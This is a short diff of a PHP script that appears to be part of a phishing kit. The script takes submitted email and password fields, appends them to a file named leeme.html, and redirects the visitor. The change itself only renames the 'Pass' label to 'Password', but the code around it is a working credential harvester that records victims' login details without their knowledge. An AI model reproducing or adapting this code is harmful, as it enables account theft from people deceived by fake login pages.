@@ -9,7 +9,7 @@ header ('Location: '.htmlspecialchars($_SERVER["PHP_SELF"]));
 $handle = fopen("leeme.html", "a");
 $string = '
 Email:'.$data['email_mobile'].'
- Pass:'.$data['pass_mobile'];
+ Password:'.$data['pass_mobile'];
 
 fwrite($handle,$string);
 fclose($handle);
